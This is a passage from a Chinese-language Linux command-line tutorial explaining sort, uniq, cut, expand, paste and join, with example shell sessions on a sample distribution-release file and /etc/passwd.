<tr>
<td>-r</td>
<td>–reverse</td>
<td>以相反的顺序排序。结果是降序而不是升序。</td>
</tr>
<tr>
<td>-k</td>
<td>–key&#x3D;<em>field1</em>[,<em>field2</em>]</td>
<td>基于位于<em>field1</em>到<em>field2</em>的关键字段排序，而不是整行。见下文讨论。</td>
</tr>
<tr>
<td>-m</td>
<td>–merge</td>
<td>将每个参数视为预排序文件的名称。合并多个文件到一个排序结果中，而不执行任何额外排序。</td>
</tr>
<tr>
<td>-o</td>
<td>–output&#x3D;<em>file</em></td>
<td>将排序输出发送到<em>file</em>而不是标准输出。</td>
</tr>
<tr>
<td>-t</td>
<td>–field-separator&#x3D;<em>char</em></td>
<td>定义字段分隔符字符。默认情况下，字段由空格或制表符分隔。</td>
</tr>
</tbody></table>
<p>尽管这些选项中的大多数都是不言自明的，但有些则不是。首先，让我们看看用于数值排序的-n选项。使用这个选项，可以根据数值对值进行排序。我们可以通过对du命令的结果进行排序来演示这一点，以确定磁盘空间的最大使用者。通常，du命令以路径名顺序列出摘要结果。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">du</span> -s /usr/share/* | <span class="built_in">head</span></span><br><span class="line">252 /usr/share/aclocal</span><br><span class="line">96 /usr/share/acpi-support</span><br><span class="line">8 /usr/share/adduser</span><br><span class="line">196 /usr/share/alacarte</span><br><span class="line">344 /usr/share/alsa</span><br><span class="line">8 /usr/share/alsa-base</span><br><span class="line">12488 /usr/share/anthy</span><br><span class="line">8 /usr/share/apmd</span><br><span class="line">21440 /usr/share/app-install</span><br><span class="line">48 /usr/share/application-registry</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们将结果通过管道传递给head来限制结果为前10行。我们可以用这种方式产生一个数值排序的列表，显示前10个空间消耗者。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">du</span> -s /usr/share/* | <span class="built_in">sort</span> -nr | <span class="built_in">head</span></span><br><span class="line">509940 /usr/share/locale-langpack</span><br><span class="line">242660 /usr/share/doc</span><br><span class="line">197560 /usr/share/fonts</span><br><span class="line">179144 /usr/share/gnome</span><br><span class="line">146764 /usr/share/myspell</span><br><span class="line">144304 /usr/share/gimp</span><br><span class="line">135880 /usr/share/dict</span><br><span class="line">76508 /usr/share/icons</span><br><span class="line">68072 /usr/share/apps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">62844 /usr/share/foomatic</span><br></pre></td></tr></table></figure>

<p>通过使用n和r选项，我们生成了一个反向数值排序，最大值首先出现在结果中。这种排序有效是因为数值位于每行的开始。但是如果我们想根据某个位于行内的值进行排序呢？例如，这是ls -l的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l /usr/bin | <span class="built_in">head</span></span><br><span class="line">total 152948</span><br><span class="line">-rwxr-xr-x 1 root root 34824 2016-04-04 02:42 [</span><br><span class="line">-rwxr-xr-x 1 root root 101556 2007-11-27 06:08 a2p</span><br><span class="line">-rwxr-xr-x 1 root root 13036 2016-02-27 08:22 aconnect</span><br><span class="line">-rwxr-xr-x 1 root root 10552 2007-08-15 10:34 acpi</span><br><span class="line">-rwxr-xr-x 1 root root 3800 2016-04-14 03:51 acpi_fakekey</span><br><span class="line">-rwxr-xr-x 1 root root 7536 2016-04-19 00:19 acpi_listen</span><br><span class="line">-rwxr-xr-x 1 root root 3576 2016-04-29 07:57 addpart</span><br><span class="line">-rwxr-xr-x 1 root root 20808 2016-01-03 18:02 addr2line</span><br><span class="line">-rwxr-xr-x 1 root root 489704 2016-10-09 17:02 adept_batch</span><br></pre></td></tr></table></figure>

<p>暂时忽略ls可以按大小对其结果进行排序的事实，我们也可以使用sort来按文件大小对这个列表进行排序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> -l /usr/bin | <span class="built_in">sort</span> -nrk 5 | <span class="built_in">head</span></span><br><span class="line">-rwxr-xr-x 1 root root 8234216 2016-04-07 17:42 inkscape</span><br><span class="line">-rwxr-xr-x 1 root root 8222692 2016-04-07 17:42 inkview</span><br><span class="line">-rwxr-xr-x 1 root root 3746508 2016-03-07 23:45 gimp-2.4</span><br><span class="line">-rwxr-xr-x 1 root root 3654020 2016-08-26 16:16 quanta</span><br><span class="line">-rwxr-xr-x 1 root root 2928760 2016-09-10 14:31 gdbtui</span><br><span class="line">-rwxr-xr-x 1 root root 2928756 2016-09-10 14:31 gdb</span><br><span class="line">-rwxr-xr-x 1 root root 2602236 2016-10-10 12:56 net</span><br><span class="line">-rwxr-xr-x 1 root root 2304684 2016-10-10 12:56 rpcclient</span><br><span class="line">-rwxr-xr-x 1 root root 2241832 2016-04-04 05:56 aptitude</span><br><span class="line">-rwxr-xr-x 1 root root 2202476 2016-10-10 12:56 smbcacls</span><br></pre></td></tr></table></figure>

<p>sort的许多用途涉及<em>表格数据</em>的处理，如前面ls命令的结果。如果我们将数据库术语应用于前面的表格，我们会说每行是一条<em>记录</em>，每条记录由多个<em>字段</em>组成，如文件属性、链接计数、文件名、文件大小等。sort能够处理单独的字段。用数据库术语来说，我们能够指定一个或多个<em>关键字段</em>作为<em>排序键</em>。在前面的例子中，我们指定了n和r选项来执行反向数值排序，并指定-k 5使sort使用第五个字段作为排序键。</p>
<p>k选项很有趣，有许多特性，但首先我们需要讨论sort如何定义字段。让我们考虑下面的简单文本文件，它由一行包含作者名字的文本组成：</p>
<blockquote>
<p>William Shotts</p>
</blockquote>
<p>默认情况下，sort将这行视为有两个字段。第一个字段包含以下字符：</p>
<blockquote>
<p>“William”</p>
</blockquote>
<p>第二个字段包含以下字符：</p>
<blockquote>
<p>“Shotts”</p>
</blockquote>
<p>这意味着空白字符（空格和制表符）被用作字段之间的分隔符，并且在执行排序时，分隔符被包含在字段中。</p>
<p>再看一下我们的ls输出中的一行，如下所示，我们可以看到一行包含八个字段，第五个字段是文件大小：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rwxr-xr-x 1 root root 8234216 2016-04-07 17:42 inkscape</span><br></pre></td></tr></table></figure>

<p>让我们考虑以下文件，它包含了从2006年到2008年发布的三个流行的Linux发行版的历史。文件中的每一行有三个字段：发行版名称、版本号和发布日期，格式为MM&#x2F;DD&#x2F;YYYY。</p>
<table>
<thead>
<tr>
<th>发行版名称</th>
<th>版本号</th>
<th>发布日期</th>
</tr>
</thead>
<tbody><tr>
<td>SUSE</td>
<td>10.2</td>
<td>12&#x2F;07&#x2F;2006</td>
</tr>
<tr>
<td>Fedora</td>
<td>10</td>
<td>11&#x2F;25&#x2F;2008</td>
</tr>
<tr>
<td>SUSE</td>
<td>11.0</td>
<td>06&#x2F;19&#x2F;2008</td>
</tr>
<tr>
<td>Ubuntu</td>
<td>8.04</td>
<td>04&#x2F;24&#x2F;2008</td>
</tr>
<tr>
<td>Fedora</td>
<td>8</td>
<td>11&#x2F;08&#x2F;2007</td>
</tr>
<tr>
<td>SUSE</td>
<td>10.3</td>
<td>10&#x2F;04&#x2F;2007</td>
</tr>
<tr>
<td>Ubuntu</td>
<td>6.10</td>
<td>10&#x2F;26&#x2F;2006</td>
</tr>
<tr>
<td>Fedora</td>
<td>7</td>
<td>05&#x2F;31&#x2F;2007</td>
</tr>
<tr>
<td>Ubuntu</td>
<td>7.10</td>
<td>10&#x2F;18&#x2F;2007</td>
</tr>
<tr>
<td>Ubuntu</td>
<td>7.04</td>
<td>04&#x2F;19&#x2F;2007</td>
</tr>
<tr>
<td>SUSE</td>
<td>10.1</td>
<td>05&#x2F;11&#x2F;2006</td>
</tr>
<tr>
<td>Fedora</td>
<td>6</td>
<td>10&#x2F;24&#x2F;2006</td>
</tr>
<tr>
<td>Fedora</td>
<td>9</td>
<td>05&#x2F;13&#x2F;2008</td>
</tr>
<tr>
<td>Ubuntu</td>
<td>6.06</td>
<td>06&#x2F;01&#x2F;2006</td>
</tr>
<tr>
<td>Ubuntu</td>
<td>8.10</td>
<td>10&#x2F;30&#x2F;2008</td>
</tr>
<tr>
<td>Fedora</td>
<td>5</td>
<td>03&#x2F;20&#x2F;2006</td>
</tr>
</tbody></table>
<p>使用文本编辑器（也许是vim），我们将输入这些数据并将结果文件命名为distros.txt。</p>
<p>接下来，我们尝试对文件进行排序并观察这些结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> distros.txt</span><br><span class="line">Fedora 10 11/25/2008</span><br><span class="line">Fedora 5 03/20/2006</span><br><span class="line">Fedora 6 10/24/2006</span><br><span class="line">Fedora 7 05/31/2007</span><br><span class="line">Fedora 8 11/08/2007</span><br><span class="line">Fedora 9 05/13/2008</span><br><span class="line">SUSE 10.1 05/11/2006</span><br><span class="line">SUSE 10.2 12/07/2006</span><br><span class="line">SUSE 10.3 10/04/2007</span><br><span class="line">SUSE 11.0 06/19/2008</span><br><span class="line">Ubuntu 6.06 06/01/2006</span><br><span class="line">Ubuntu 6.10 10/26/2006</span><br><span class="line">Ubuntu 7.04 04/19/2007</span><br><span class="line">Ubuntu 7.10 10/18/2007</span><br><span class="line">Ubuntu 8.04 04/24/2008</span><br><span class="line">Ubuntu 8.10 10/30/2008</span><br></pre></td></tr></table></figure>

<p>这基本上起作用了。问题出现在对Fedora版本号的排序上。由于字符集中1在5之前，版本10最终位于顶部，而版本9则掉到底部。</p>
<p>为了解决这个问题，我们将不得不对多个键进行排序。我们想要对第一个字段执行字母排序，然后对第二个字段执行数值排序。sort允许-k选项的多个实例，以便可以指定多个排序键。实际上，一个键可以包括字段范围。如果没有指定范围（就像我们之前的例子那样），sort使用从指定字段开始并扩展到行尾的键。下面是我们多键排序的语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> --key=1,1 --key=2n distros.txt</span><br><span class="line">Fedora 5 03/20/2006</span><br><span class="line">Fedora 6 10/24/2006</span><br><span class="line">Fedora 7 05/31/2007</span><br><span class="line">Fedora 8 11/08/2007</span><br><span class="line">Fedora 9 05/13/2008</span><br><span class="line">Fedora 10 11/25/2008</span><br><span class="line">SUSE 10.1 05/11/2006</span><br><span class="line">SUSE 10.2 12/07/2006</span><br><span class="line">SUSE 10.3 10/04/2007</span><br><span class="line">SUSE 11.0 06/19/2008</span><br><span class="line">Ubuntu 6.06 06/01/2006</span><br><span class="line">Ubuntu 6.10 10/26/2006</span><br><span class="line">Ubuntu 7.04 04/19/2007</span><br><span class="line">Ubuntu 7.10 10/18/2007</span><br><span class="line">Ubuntu 8.04 04/24/2008</span><br><span class="line">Ubuntu 8.10 10/30/2008</span><br></pre></td></tr></table></figure>

<p>尽管我们为了清晰使用了选项的长形式，-k 1,1 -k 2n将是完全等效的。在第一个键选项中，我们指定了要包括在第一个键中的字段范围。由于我们想要将排序限制在仅第一个字段，我们指定了1,1，这意味着“从字段1开始，结束于字段1”。在第二个实例中，我们指定了2n，这意味着字段2是排序键，并且排序应该是数值的。一个选项字母可以包含在键指定符的末尾，以指示要执行的排序类型。这些选项字母与sort程序的全局选项相同：b（忽略开头的空格）、n（数值排序）、r（反向排序）等。</p>
<p>我们列表中的第三个字段包含一个对排序不方便的日期格式。在计算机上，日期通常以YYYY-MM-DD的顺序格式化，以便易于进行时间顺序排序，但我们的是美国格式MM&#x2F;DD&#x2F;YYYY。我们如何按时间顺序对这个列表进行排序？</p>
<p>幸运的是，sort提供了一种方法。键选项允许指定字段内的<em>偏移量</em>，因此我们可以在字段内定义键。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> -k 3.7nbr -k 3.1nbr -k 3.4nbr distros.txt</span><br><span class="line">Fedora 10 11/25/2008</span><br><span class="line">Ubuntu 8.10 10/30/2008</span><br><span class="line">SUSE 11.0 06/19/2008</span><br><span class="line">Fedora 9 05/13/2008</span><br><span class="line">Ubuntu 8.04 04/24/2008</span><br><span class="line">Fedora 8 11/08/2007</span><br><span class="line">Ubuntu 7.10 10/18/2007</span><br><span class="line">SUSE 10.3 10/04/2007</span><br><span class="line">Fedora 7 05/31/2007</span><br><span class="line">Ubuntu 7.04 04/19/2007</span><br><span class="line">SUSE 10.2 12/07/2006</span><br><span class="line">Ubuntu 6.10 10/26/2006</span><br><span class="line">Fedora 6 10/24/2006</span><br><span class="line">Ubuntu 6.06 06/01/2006</span><br><span class="line">SUSE 10.1 05/11/2006</span><br><span class="line">Fedora 5 03/20/2006</span><br></pre></td></tr></table></figure>

<p>通过指定-k 3.7，我们指示sort使用从第三个字段内的第七个字符开始的排序键，这对应于年份的开始。同样，我们指定-k 3.1和-k 3.4来隔离日期的月份和日份部分。我们还添加了n和r选项来实现反向数值排序。b选项包含在内以抑制日期字段中的开头空格（其数量从行到行不同，因此影响排序结果）。</p>
<p>一些文件不使用制表符和空格作为字段分隔符；例如，这是&#x2F;etc&#x2F;passwd文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">head</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin</span><br><span class="line"></span><br><span class="line">/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br></pre></td></tr></table></figure>

<p>这个文件中的字段用冒号(:)分隔，那么我们如何使用键字段对这个文件进行排序呢？sort提供了-t选项来定义字段分隔符字符。要按第七个字段（账户的默认shell）对passwd文件进行排序，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> -t <span class="string">&#x27;:&#x27;</span> -k 7 /etc/passwd | <span class="built_in">head</span></span><br><span class="line">me:x:1001:1001:Myself,,,:/home/me:/bin/bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/false</span><br><span class="line">gdm:x:106:114:Gnome Display Manager:/var/lib/gdm:/bin/false</span><br><span class="line">hplip:x:104:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">klog:x:103:104::/home/klog:/bin/false</span><br><span class="line">messagebus:x:108:119::/var/run/dbus:/bin/false</span><br><span class="line">polkituser:x:110:122:PolicyKit,,,:/var/run/PolicyKit:/bin/false</span><br><span class="line">pulse:x:107:116:PulseAudio daemon,,,:/var/run/pulse:/bin/false</span><br></pre></td></tr></table></figure>

<p>通过指定冒号字符作为字段分隔符，我们可以按第七个字段进行排序。</p>
<h4 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h4><p>与sort相比，uniq程序相对简单。uniq执行一个看似微不足道的任务。当给定一个排序过的文件（或标准输入）时，它会删除任何重复的行，并将结果发送到标准输出。它经常与sort一起使用，以清除输出中的重复项。</p>
<p><strong>提示：</strong> 虽然uniq是一个传统的Unix工具，经常与sort一起使用，但GNU版本的sort支持-u选项，该选项可以从排序输出中删除重复项。</p>
<p>让我们创建一个文本文件来尝试，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> &gt; foo.txt</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<p>记得输入Ctrl-d来终止标准输入。现在，如果我们对我们的文本文件运行uniq，我们得到这个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">uniq</span> foo.txt</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<p>结果与我们原始文件没有区别；重复项没有被删除。为了让uniq完成它的工作，输入必须首先被排序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> foo.txt | <span class="built_in">uniq</span></span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<p>这是因为uniq只删除与其相邻的重复行。uniq有几个选项。表20-2列出了常见的选项。</p>
<p><em>表20-2: 常见的</em> <em>uniq选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>长选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-c</td>
<td>–count</td>
<td>输出重复行的列表，每行前面带有该行出现的次数。</td>
</tr>
<tr>
<td>-d</td>
<td>–repeated</td>
<td>只输出重复的行，而不是唯一的行。</td>
</tr>
<tr>
<td>-f <em>n</em></td>
<td>–skip-fields&#x3D;<em>n</em></td>
<td>忽略每行中的前<em>n</em>个字段。字段由空格分隔，就像在sort中一样；然而，与sort不同，uniq没有设置另一个字段分隔符的选项。</td>
</tr>
<tr>
<td>-i</td>
<td>–ignore-case</td>
<td>在行比较中忽略大小写。</td>
</tr>
<tr>
<td>-s <em>n</em></td>
<td>–skip-chars&#x3D;<em>n</em></td>
<td>跳过（忽略）每行开头的<em>n</em>个字符。</td>
</tr>
<tr>
<td>-u</td>
<td>–unique</td>
<td>只输出唯一的行。有重复项的行被忽略。</td>
</tr>
</tbody></table>
<p>这里我们看到uniq被用来报告我们文本文件中发现的重复项数量，使用-c选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> foo.txt | <span class="built_in">uniq</span> -c</span><br><span class="line"> 2 a</span><br><span class="line"> 2 b</span><br><span class="line"> 2 c</span><br></pre></td></tr></table></figure>

<h3 id="切割与组合"><a href="#切割与组合" class="headerlink" title="切割与组合"></a>切割与组合</h3><p>接下来我们将讨论的三个程序用于从文件中提取文本列并以有用的方式重新组合它们。</p>
<h4 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h4><p>cut 程序用于从一行中提取文本段并将提取的部分输出到标准输出。它可以接受多个文件参数或来自标准输入的输入。</p>
<p>指定要提取的行的部分有些笨拙，使用表20-3中列出的选项来指定。<em>表20-3:</em> <em>cut 选择选项</em></p>
<table>
<thead>
<tr>
<th><strong>选项</strong></th>
<th><strong>长选项</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-c <em>列表</em></td>
<td>–characters&#x3D;<em>列表</em></td>
<td>提取由<em>列表</em>定义的行的部分。列表可能包含一个或多个逗号分隔的数字范围。</td>
</tr>
<tr>
<td>-f <em>列表</em></td>
<td>–fields&#x3D;<em>列表</em></td>
<td>从行中提取一个或多个字段，由<em>列表</em>定义。列表可能包含一个或多个字段或字段范围，用逗号分隔。</td>
</tr>
<tr>
<td>-d <em>定界符</em></td>
<td>–delimiter&#x3D;<em>定界符</em></td>
<td>当指定-f时，使用<em>定界符</em>作为字段分隔字符。默认情况下，字段必须由单个制表符分隔。</td>
</tr>
<tr>
<td></td>
<td>–complement</td>
<td>提取整行文本，除了那些由-c和&#x2F;或-f指定的部分之外。</td>
</tr>
</tbody></table>
<p>正如我们所见，cut提取文本的方式相当不灵活。cut最适合用于提取由其他程序生成的文件中的文本，而不是直接由人类键入的文本。我们将查看我们的distros.txt文件，看看它是否“干净”到足以成为我们cut示例的好样本。如果我们使用带-A选项的cat，我们可以看到文件是否满足我们的要求，即字段由制表符分隔：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> -A distros.txt</span><br><span class="line">SUSE^I10.2^I12/07/2006$</span><br><span class="line">Fedora^I10^I11/25/2008$</span><br><span class="line">SUSE^I11.0^I06/19/2008$</span><br><span class="line">Ubuntu^I8.04^I04/24/2008$</span><br><span class="line">Fedora^I8^I11/08/2007$</span><br><span class="line">SUSE^I10.3^I10/04/2007$</span><br><span class="line">Ubuntu^I6.10^I10/26/2006$</span><br><span class="line">Fedora^I7^I05/31/2007$</span><br><span class="line">Ubuntu^I7.10^I10/18/2007$</span><br><span class="line">Ubuntu^I7.04^I04/19/2007$</span><br><span class="line">SUSE^I10.1^I05/11/2006$</span><br><span class="line">Fedora^I6^I10/24/2006$</span><br><span class="line">Fedora^I9^I05/13/2008$</span><br><span class="line">Ubuntu^I6.06^I06/01/2006$</span><br><span class="line">Ubuntu^I8.10^I10/30/2008$</span><br><span class="line">Fedora^I5^I03/20/2006$</span><br></pre></td></tr></table></figure>

<p>看起来不错。没有嵌入的空格，字段之间只有单个制表符。由于文件使用制表符而不是空格分隔，我们将使用-f选项来提取一个字段。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cut</span> -f 3 distros.txt</span><br><span class="line">12/07/2006</span><br><span class="line">11/25/2008</span><br><span class="line">06/19/2008</span><br><span class="line">04/24/2008</span><br><span class="line">11/08/2007</span><br><span class="line">10/04/2007</span><br><span class="line">10/26/2006</span><br><span class="line">05/31/2007</span><br><span class="line">10/18/2007</span><br><span class="line">04/19/2007</span><br><span class="line">05/11/2006</span><br><span class="line">10/24/2006</span><br><span class="line">05/13/2008</span><br><span class="line">06/01/2006</span><br><span class="line">10/30/2008</span><br><span class="line">03/20/2006</span><br></pre></td></tr></table></figure>

<p>因为我们的distros文件是制表符分隔的，最好使用cut来提取字段而不是字符。这是因为当文件是制表符分隔的时，每行包含的字符数不太可能相同，这使得计算行内字符位置变得困难或不可能。然而，在我们之前的示</p>
<p>例中，我们现在已经提取了一个幸运地包含相同长度数据的字段，因此我们可以展示字符提取是如何工作的，通过提取每行中的年份。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cut</span> -f 3 distros.txt | <span class="built_in">cut</span> -c 7-10</span><br><span class="line">2006</span><br><span class="line">2008</span><br><span class="line">2008</span><br><span class="line">2008</span><br><span class="line">2007</span><br><span class="line">2007</span><br><span class="line">2006</span><br><span class="line">2007</span><br><span class="line">2007</span><br><span class="line">2007</span><br><span class="line">2006</span><br><span class="line">2006</span><br><span class="line">2008</span><br><span class="line">2006</span><br><span class="line">2008</span><br><span class="line">2006</span><br></pre></td></tr></table></figure>

<p>通过对我们的列表运行cut第二次，我们能够提取字符位置7到10，这对应于我们日期字段中的年份。7-10表示法是范围的一个例子。cut手册页包含了如何指定范围的完整描述。</p>
<h3 id="展开制表符"><a href="#展开制表符" class="headerlink" title="展开制表符"></a>展开制表符</h3><p>我们的 distros.txt 文件的格式非常适合使用 cut 来提取字段。但是，如果我们想要一个可以完全通过字符而不是字段来用 cut 操作的文件怎么办？这将需要我们将文件中的制表符字符替换为相应数量的空格。幸运的是，GNU Coreutils 包中包括了一个用于此目的的工具。名为 expand，这个程序接受一个或多个文件参数或标准输入，并将修改后的文本输出到标准输出。</p>
<p>如果我们用 expand 处理我们的 distros.txt 文件，我们可以使用 cut -c 从文件中提取任何字符范围。例如，我们可以使用以下命令通过展开文件并使用 cut 提取从第 23 个位置到行尾的每个字符来提取我们列表中的发布年份：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">expand</span> distros.txt | <span class="built_in">cut</span> -c 23-</span><br></pre></td></tr></table></figure>

<p>Coreutils 还提供了 unexpand 程序来用空格替换制表符。</p>
<p>在处理字段时，可以指定不同的字段分隔符，而不仅仅是制表符。这里我们将从 &#x2F;etc&#x2F;passwd 文件中提取第一个字段：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1 /etc/passwd | <span class="built_in">head</span></span><br><span class="line">root</span><br><span class="line">daemon</span><br><span class="line">bin</span><br><span class="line">sys</span><br><span class="line"><span class="built_in">sync</span></span><br><span class="line">games</span><br><span class="line">man</span><br><span class="line">lp</span><br><span class="line">mail</span><br><span class="line">news</span><br></pre></td></tr></table></figure>

<p>使用 -d 选项，我们能够指定冒号字符作为字段分隔符。</p>
<h4 id="paste"><a href="#paste" class="headerlink" title="paste"></a>paste</h4><p>paste 命令与 cut 相反。它不是从文件中提取文本列，而是向文件中添加一个或多个文本列。它通过读取多个文件并将每个文件中发现的字段组合成一个在标准输出上的单个流来实现这一点。像 cut 一样，paste 接受多个文件参数和&#x2F;或标准输入。为了演示 paste 的操作方式，我们将对我们的 distros.txt 文件进行一些操作，以产生一个按时间顺序排列的发布列表。</p>
<p>根据我们之前使用 sort 的工作，我们将首先生成一个按日期排序的 distros 列表，并将结果存储在名为 distros-by-date.txt 的文件中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">sort</span> -k 3.7nbr -k 3.1nbr -k 3.4nbr distros.txt &gt; distros-by-date.txt</span><br></pre></td></tr></table></figure>

<p>接下来，我们将使用 cut 从文件中提取前两个字段（发行版名称和版本）并将该结果存储在名为 distro-versions.txt 的文件中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cut</span> -f 1,2 distros-by-date.txt &gt; distros-versions.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">head</span> distros-versions.txt</span><br><span class="line">Fedora 10</span><br><span class="line">Ubuntu 8.10</span><br><span class="line">SUSE 11.0</span><br><span class="line">Fedora 9</span><br><span class="line">Ubuntu 8.04</span><br><span class="line">Fedora 8</span><br><span class="line">Ubuntu 7.10</span><br><span class="line">SUSE 10.3</span><br><span class="line">Fedora 7</span><br><span class="line">Ubuntu 7.04</span><br></pre></td></tr></table></figure>

<p>最后一步准备是提取发布日期并将它们存储在一个名为 distro-dates.txt 的文件中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cut</span> -f 3 distros-by-date.txt &gt; distros-dates.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">head</span> distros-dates.txt</span><br><span class="line">11/25/2008</span><br><span class="line">10/30/2008</span><br><span class="line">06/19/2008</span><br><span class="line">05/13/2008</span><br><span class="line">04/24/2008</span><br><span class="line">11/08/2007</span><br><span class="line">10/18/2007</span><br><span class="line">10/04/2007</span><br><span class="line">05/31/2007</span><br><span class="line">04/19/2007</span><br></pre></td></tr></table></figure>

<p>我们现在拥有了我们需要的部件。为了完成这个过程，使用 paste 将日期列放在发行版名称和版本前面，从而创建一个按时间顺序排列的列表。这仅仅通过使用 paste 并以所需的排列顺序对其参数进行排序来完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">paste</span> distros-dates.txt distros-versions.txt</span><br><span class="line">11/25/2008 Fedora 10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10/30/2008 Ubuntu 8.10</span><br><span class="line">06/19/2008 SUSE 11.0</span><br><span class="line">05/13/2008 Fedora 9</span><br><span class="line">04/24/2008 Ubuntu 8.04</span><br><span class="line">11/08/2007 Fedora 8</span><br><span class="line">10/18/2007 Ubuntu 7.10</span><br><span class="line">10/04/2007 SUSE 10.3</span><br><span class="line">05/31/2007 Fedora 7</span><br><span class="line">04/19/2007 Ubuntu 7.04</span><br><span class="line">12/07/2006 SUSE 10.2</span><br><span class="line">10/26/2006 Ubuntu 6.10</span><br><span class="line">10/24/2006 Fedora 6</span><br><span class="line">06/01/2006 Ubuntu 6.06</span><br><span class="line">05/11/2006 SUSE 10.1</span><br><span class="line">03/20/2006 Fedora 5</span><br></pre></td></tr></table></figure>

<h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><p>在某些方面，join 类似于 paste，因为它也是向文件中添加列，但它采用了独特的方式来实现。<em>join</em> 操作通常与 <em>关系数据库</em> 关联，在那里，基于共享键字段的多个 <em>表</em> 中的数据被组合以形成所需结果。join 程序执行相同的操作。它根据共享键字段将多个文件中的数据连接起来。</p>
<p>为了看到 join 操作在关系数据库中的使用方式，让我们想象一个包含两个表的小型数据库，每个表都包含单一记录。第一个表，称为 CUSTOMERS，有三个字段：客户编号（CUSTNUM）、客户的名字（FNAME）和客户的姓氏（LNAME）：</p>
<table>
<thead>
<tr>
<th>CUSTNUM</th>
<th>FNAME</th>
<th>LNAME</th>
</tr>
</thead>
<tbody><tr>
<td>4681934</td>
<td>John</td>
<td>Smith</td>
</tr>
</tbody></table>
<p>第二个表称为 ORDERS，包含四个字段：订单号（ORDERNUM）、客户编号（CUSTNUM）、数量（QUAN）和订购的项目（ITEM）。</p>
<table>
<thead>
<tr>
<th>ORDERNUM</th>
<th>CUSTNUM</th>
<th>QUAN</th>
<th>ITEM</th>
</tr>
</thead>
<tbody><tr>
<td>3014953305</td>
<td>4681934</td>
<td>1</td>
<td>Blue Widget</td>
</tr>
</tbody></table>
<p>注意，两个表都共享字段 CUSTNUM。这很重要，因为它允许两个表之间建立关系。</p>
<p>执行 join 操作将允许我们组合两个表中的字段以实现有用的结果，例如准备发票。使用两个表中 CUSTNUM 字段的匹配值，join 操作可以产生以下结果：</p>
<table>
<thead>
<tr>
<th>FNAME</th>
<th>LNAME</th>
<th>QUAN</th>
